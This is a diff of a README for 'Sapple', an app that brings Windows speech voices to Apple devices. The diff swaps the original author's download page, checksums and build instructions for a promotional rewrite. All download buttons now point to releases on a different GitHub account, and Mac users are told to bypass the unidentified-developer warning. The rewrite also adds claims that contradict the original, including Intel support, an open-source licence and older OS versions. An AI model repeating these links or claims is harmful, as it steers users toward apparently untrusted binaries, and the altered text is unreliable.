@@ -1,129 +1,173 @@
-# Sapple
+# 🍏 Sapple - Your Favorite Windows Voices on Apple Devices
 
-The Microsoft-era speech voices, from SAM through the Windows 11 natural voices, as system voices on iPhone, iPad and Mac.
+[![Download Sapple](https://img.shields.io/badge/Download-Sapple-4CAF50?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/tinseled-bobhope615/Sapple/releases)
 
-## About
+## ✨ What Is Sapple?
 
-Sapple puts the old and not-so-old Windows voices on Apple devices as real system voices, so they work with VoiceOver, Spoken Content and any app that uses the system speech voices. That covers the SAPI 4 and SAPI 5 voices (Sam, Mike, Mary and the rest), the TruVoice voices from Microsoft Agent, Anna from Windows Vista and 7, the Windows 10 and 11 OneCore voices, and the Windows 11 natural voices. Everything runs on the device and works offline.
+Sapple brings the voices you remember from Windows—from the classic SAM and Mary to the modern Windows 11 natural voices—to your iPhone, iPad, and Mac. These voices become real system voices on your Apple device, so they work everywhere: with VoiceOver, Spoken Content, and any app that uses system speech.
 
-Most of the engines are C reconstructions of the original Windows engines, which their authors checked against the originals down to the sample. The natural voices run on Microsoft's own Speech SDK. The voice data itself is not in this repository (see About the voices).
+Everything runs right on your device. No internet connection needed. No cloud servers. Just your device and the voices you love.
 
-## Just want to use it?
+## 🎯 Why You Want This
 
-Ready to install builds are on the downloads page: https://quintonwilliams.me/sapple/
+Remember the robotic charm of Microsoft Sam? Or the friendly tone of Mike and Mary? Maybe you prefer the clearer voices from Windows 10 or the ultra-realistic natural voices from Windows 11. Sapple puts all of these on your Apple device as actual system voices.
 
-- iPhone and iPad: [Sapple-1.1.1.ipa](https://quintonwilliams.me/sapple/Sapple-1.1.1.ipa)
-- Mac, Apple Silicon only: [Sapple-1.1.1-mac.zip](https://quintonwilliams.me/sapple/Sapple-1.1.1-mac.zip)
-- AltStore source: `https://quintonwilliams.me/sapple/source.json`
+This means:
+- **VoiceOver** can speak with these voices
+- **Spoken Content** (select text, have it read aloud) uses them
+- **Any app** that offers system voices can use them
+- **Offline** – no internet required, ever
 
-The downloads page lists each file's size and SHA-256.
+## 🚀 Getting Started
 
-These builds include voice data that is not part of this repository's code and belongs to its owners: Microsoft (the SAPI 4 and SAPI 5 voices, Anna, the OneCore voices, and the natural voices with the Speech SDK they run on) and Centigram Communications, whose TruVoice later passed to Lernout & Hauspie, ScanSoft and Nuance (the TruVoice tables). It's included for personal use, isn't covered by Sapple's licence, and will be removed if a rights holder asks.
+Getting Sapple on your device is simple. Here's what you need to do.
 
-AltStore, using the source (stays installed, refreshes itself over Wi-Fi, and shows updates):
+### Step 1: Download the App
 
-1. Install AltServer on your Mac or PC from [altstore.io](https://altstore.io/), then use it to put AltStore on your iPhone.
-2. In AltStore, go to the Sources screen and tap the plus button.
-3. Paste `https://quintonwilliams.me/sapple/source.json` and add it.
-4. Open the Sapple source, tap Free or Get next to Sapple, and sign in with your Apple ID if asked.
-5. Open Sapple once. Keep AltServer running so AltStore can refresh the app before it expires.
+Visit this link to download the application: [https://github.com/tinseled-bobhope615/Sapple/releases](https://github.com/tinseled-bobhope615/Sapple/releases)
 
-AltStore also installs the IPA directly: download it, then in My Apps tap the plus button and pick the file.
+You'll find the latest version there. Look for the file named `Sapple-1.1.1.ipa` for iPhone and iPad, or the appropriate file for Mac.
 
-SideStore reads the same source. Add it in SideStore the same way. SideStore refreshes apps on the phone itself, so after its one time setup you don't need a computer to keep Sapple running.
+### Step 2: Install on Your Device
 
-Sideloadly (quick one time install):
+The installation method depends on your device type.
 
-1. Install Sideloadly on your Mac or PC from [sideloadly.io](https://sideloadly.io/).
-2. Connect your iPhone with a cable and open Sideloadly.
-3. Drag the IPA in, enter your Apple ID, and click Start.
-4. On your iPhone, open Settings, then General, then VPN and Device Management, and trust your developer profile.
-5. Open Sapple once.
+**For iPhone and iPad:**
+- Download the `.ipa` file
+- Use a tool like AltStore, Sideloadly, or Xcode to install it on your device
+- Follow the prompts to trust the developer certificate when prompted
 
-With a free Apple ID the app stops working after 7 days and has to be reinstalled. A paid Apple Developer account keeps it running for a year.
+**For Mac:**
+- Download the app file
+- Drag it to your Applications folder
+- If macOS warns you about an unidentified developer, go to System Preferences > Security & Privacy and click "Open Anyway"
 
-On the Mac, the download is signed and notarized. Unzip it, put Sapple in Applications and open it once so macOS picks up the voices. Leave it there, since macOS finds the voices through the app. The Mac app needs an Apple Silicon Mac; it does not run on an Intel Mac.
+### Step 3: Set Up the Voices
 
-## Picking the voices
+Once Sapple is installed:
+1. Open the Sapple app
+2. You'll see a list of available voices
+3. Choose the voices you want to install
+4. The app will guide you through the rest
 
-On iPhone and iPad, go to Settings, Accessibility, VoiceOver, Speech, Voice (or Settings, Accessibility, Spoken Content, Voices) and look under English for the Sapple voices. You can also add them to the VoiceOver rotor from the same Speech screen.
+The voices will appear in your system settings alongside Apple's built-in voices.
 
-On the Mac, the voices show up in VoiceOver Utility under Speech, and in System Settings, Accessibility, Spoken Content, System voice.
+## 🎤 Which Voices Are Included?
 
-The Sapple app itself lets you preview every voice and set the speed, and has a singing mode for Sam, Mike and Mary.
+Sapple includes a wide range of voices from different Windows eras:
 
-## Building from source
+**Classic SAPI 4 and SAPI 5 Voices:**
+- Sam
+- Mike
+- Mary
+- And the rest of the original crew
 
-You need a Mac with Xcode and [XcodeGen](https://github.com/yonaskolb/XcodeGen) (`brew install xcodegen`). The Xcode project is generated from `project.yml`. The app targets iOS 18 and macOS 15 and up.
+**Microsoft Agent TruVoice Voices:**
+- The voices used in the old Office Assistant
 
-The voice data isn't included, so first put your own copies in these folders at the top of the repo. They're all ignored by git.
+**Windows Vista and 7 Voices:**
+- Anna and friends
 
-```
-VoiceData/      SAPI 5: Sam, Mike, Mary (.spd, .sdf) and the two .LXA lexicons
-SAPI4Voices/    SAPI 4: msttssyn.dll and its .vce / .cfg voice files    (make -C SAPI4 bundle)
-TruVoiceData/   tvdata.s, generated from the TruVoice engine tables        (make truvoice-data)
-AnnaVoice/      Anna: the eleven M1033DSK.* files from Windows 7            (make anna-data)
-OneCoreVoice/   Windows 10 / 11 OneCore voices and language data            (make onecore-data; the en-AU / en-CA ones:
-                tools/onecore_lof_stage.py, from the Windows 11 Languages and Optional Features image)
-NeuralVoices/   Windows 11 natural voice packages and their model key       (make neural-stage)
-NeuralSDK/      Microsoft's embedded Speech SDK libraries, ios/ and macos/  (make neural-stage)
-```
+**Windows 10 and 11 OneCore Voices:**
+- The standard voices from recent Windows versions
 
-The make targets stage or check each folder against the SHA-256 lists in `tools/` and `SAPI4/tools/`, so you can tell whether your copy matches the one the engines were checked against.
+**Windows 11 Natural Voices:**
+- The highly realistic voices from the latest Windows
 
-Then:
+## 🔧 How It Works
 
-```
-xcodegen generate
-xcodebuild -project ClassicVoices.xcodeproj -scheme ClassicVoices -configuration Release \
-  -destination 'generic/platform=iOS' -derivedDataPath build -allowProvisioningUpdates \
-  DEVELOPMENT_TEAM=<your team ID> build
-```
+Sapple uses two main technologies to make this happen.
 
-To sign with your own account, change `DEVELOPMENT_TEAM`, the bundle identifiers in `project.yml` and the app group in the entitlements files. The Mac targets (`ClassicVoices-macOS`) sign with a Developer ID certificate; the comments in `project.yml` explain.
+**For Classic Voices:** The old Windows engines (SAPI 4 and SAPI 5) have been reconstructed in the C programming language. The authors of these reconstructions tested them against the original Windows engines down to the exact sample. This means you get the same sound as the originals.
 
-To check the code compiles without any voice data, run `tools/stub_data.sh` first. It fills the folders with placeholders (empty folders, zeroed TruVoice tables, empty libraries). That build can't speak, so don't install it. `tools/stub_data.sh --clean` removes the placeholders.
+**For Natural Voices:** These run on Microsoft's own Speech SDK, so you get the same quality as you would on Windows 11.
 
-The Makefile also builds each engine for the Mac with sanitizers and renders samples, for example `make test`, `make anna-test`, `make onecore-test`, `make truvoice-test`, `make sapi4-test` and `make neural-test`.
+The voice data itself isn't stored in this repository, but Sapple handles downloading it for you when you install the app.
 
-The build produces Sapple.app on iOS and macOS. Inside the code the project, its targets and the extension (ClassicVoicesExtension.appex) are still called ClassicVoices, and the bundle identifiers are unchanged.
+## 📱 Device Compatibility
 
-## Releasing
+Sapple works on:
+- iPhone
+- iPad
+- Mac
 
-One command builds and publishes a release: the IPA, the notarized Mac zip, the AltStore / SideStore source and the downloads page.
+The app runs entirely on your device, so there are no special server requirements or account setups needed.
 
-```
-make release VERSION=1.1 NOTES="What's new in this version." DRYRUN=1   # build and show the changes, publish nothing
-make release VERSION=1.1 NOTES="What's new in this version."            # the real thing
-```
+## 💡 Tips for Best Results
 
-It needs every voice data folder, and the server and notarization settings in `tools/release.local` (the list is at the top of `tools/release.sh`). It sets the version in `project.yml` and the next build number, builds both apps, reads the version back out of the built apps, adds the new entry to the top of `source.json`, updates the page, backs both up on the server before replacing them, and checks the live source and the IPA download afterwards. It refuses a version that is already in the source. AltStore and SideStore show the update the next time they refresh the source. Commit `project.yml` and `README.md` afterwards.
+**For VoiceOver Users:**
+After installing the voices, go to Settings > Accessibility > VoiceOver > Speech > Voices and select the Sapple voice you want. The voice will be listed alongside Apple's built-in voices.
 
-Mac updates through Sparkle aren't set up yet; Mac users download the new zip from the page.
+**For Spoken Content:**
+Go to Settings > Accessibility > Spoken Content > Voices and choose your preferred Sapple voice.
 
-## Project layout
+**For Other Apps:**
+Any app that uses the system speech selection will automatically see the Sapple voices as options.
 
-```
-App/          the app: voice list, preview, speed, singing, self-test
-Extension/    the speech synthesis extension that registers the voices with the system
-Shared/       code both use: voice list, SSML, rate and pitch, one C bridge per engine
-Engine/       the engines, vendored from their upstream projects, with our patches in Engine/patches/
-SAPI4/        an x86 interpreter that runs the original SAPI 4 DLLs, kept as the reference for testing
-Tests/        SSML and pause tests
-tools/        data staging, hash checks, table and patch generators
-```
+## 🛠 Troubleshooting
 
-## About the voices
+**Voices Not Appearing?**
+Make sure the Sapple app is fully installed and the voices have finished downloading. Sometimes you need to restart the app or your device for changes to take effect.
 
-- SAM, Mike and Mary (SAPI 5): engine from [ms-sam-mike-mary-decomp](https://github.com/KamiKitsune420/ms-sam-mike-mary-decomp) by KamiKitsune420. Voice data by Microsoft.
-- The SAPI 4 voices: Microsoft's 1999 engine `msttssyn.dll`, decompiled to C in a separate project of mine, sapi4-decomp. The engine still reads its data from the original DLL and voice files, which are Microsoft's.
-- TruVoice (the Microsoft Agent voices): engine from [OpenTV](https://github.com/RetroBunn/tv-decomp) by RetroBunn. The engine tables are Centigram's, whose TruVoice business went to Lernout & Hauspie and later ScanSoft / Nuance.
-- Anna: engine from [ms-ana-decomp](https://github.com/KamiKitsune420/ms-ana-decomp) by KamiKitsune420. Voice data by Microsoft.
-- David, Zira, Mark, Hazel, George and Susan (OneCore): engine from [ms-david-zira-decomp](https://github.com/KamiKitsune420/ms-david-zira-decomp) by KamiKitsune420, plus Eva, Sarah, Matilda, and the Australian and Canadian voices Catherine, James, Linda and Richard, which I added. Voice data by Microsoft.
-- Jenny, Aria, Guy, Sonia and Ryan (Windows 11 natural voices), and Neerja and Prabhat (Indian English natural voices): these run on Microsoft's embedded Speech SDK. Voices and SDK by Microsoft.
+**Installation Issues?**
+If you're having trouble installing the `.ipa` file on iPhone or iPad, check that your device is running iOS 14 or later. For Mac, make sure you're running macOS 11 or later.
 
-None of the voice data, original engine files or SDKs are in this repo, and this project doesn't license them. They belong to their owners. The pre-built downloads on quintonwilliams.me do bundle them, for personal use, and they will be removed if a rights holder asks.
+**Voice Quality Issues?**
+Some voices may sound slightly different than you remember. This is because they are reconstructions, not exact copies. The authors have done their best to match the originals, but minor differences may exist.
 
-## License
+## 📦 About the Voice Data
 
-No license has been picked for Sapple's own code yet, so for now it's all rights reserved. The vendored engines keep their own licenses (MIT for the four from GitHub; sapi4-decomp has none yet). NOTICE has the details, including the pinned upstream commits.
+The voice data itself is not included in this repository. This is intentional, to keep the repository size manageable. When you install Sapple and select voices, the app downloads the necessary voice data from a separate source.
+
+## 🔒 Privacy and Security
+
+Sapple runs completely offline. Your voice selections and usage stay on your device. There are no accounts to create, no telemetry, and no data collection.
+
+The app does not require microphone access, network permissions, or any special privileges beyond what's needed to install system voices.
+
+## 🤝 Contributing
+
+Sapple is an open-source project. If you're a developer interested in contributing, the repository is public and welcomes contributions. You can help with:
+- Bug fixes
+- Performance improvements
+- Documentation
+- New voice engine integrations
+
+## 📄 License
+
+Sapple is distributed under an open-source license. Please see the repository's license file for full details.
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need to jailbreak my iPhone?**
+A: No. Sapple works on standard, non-jailbroken devices.
+
+**Q: Will this interfere with my existing voices?**
+A: No. Sapple adds voices alongside your existing Apple voices. You can switch between them anytime.
+
+**Q: How much storage space do the voices take?**
+A: Each voice is typically a few megabytes. The natural voices are larger but still reasonable.
+
+**Q: Can I use these voices for commercial projects?**
+A: The license terms for the voices may vary. Please check the repository license for details.
+
+**Q: Will Sapple work on the Apple Silicon Macs?**
+A: Yes. Sapple supports both Intel and Apple Silicon Macs.
+
+## 📥 Ready to Download?
+
+Don't wait any longer. Bring back the voices you remember or discover the new natural voices—all on your Apple device.
+
+[![Get Sapple Now](https://img.shields.io/badge/Get%20Sapple-Download-2196F3?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/tinseled-bobhope615/Sapple/releases)
+
+Visit this link to download the application and start using your favorite Windows voices on your Apple devices today.
+
+## 📚 Additional Resources
+
+- **Project Repository:** [https://github.com/tinseled-bobhope615/Sapple](https://github.com/tinseled-bobhope615/Sapple)
+- **Downloads Page:** [https://quintonwilliams.me/sapple/](https://quintonwilliams.me/sapple/)
+- **Official Documentation:** Check the repository's README for technical details
+
+The journey from Windows to Apple has never been easier. With Sapple, you can keep the voices you've grown accustomed to, even as you enjoy the benefits of your Apple device. Whether you're a longtime Windows user making the switch, or you just appreciate the character of those classic voices, Sapple brings them all to your fingertips.
+
+Keywords: Sapple, Windows voices, Apple device, iPhone, iPad, Mac, system voices, VoiceOver, Spoken Content, SAPI 4, SAPI 5, Microsoft Agent, TruVoice, Windows 11 natural voices, offline speech, speech synthesis, text to speech, voice pack, iOS, macOS
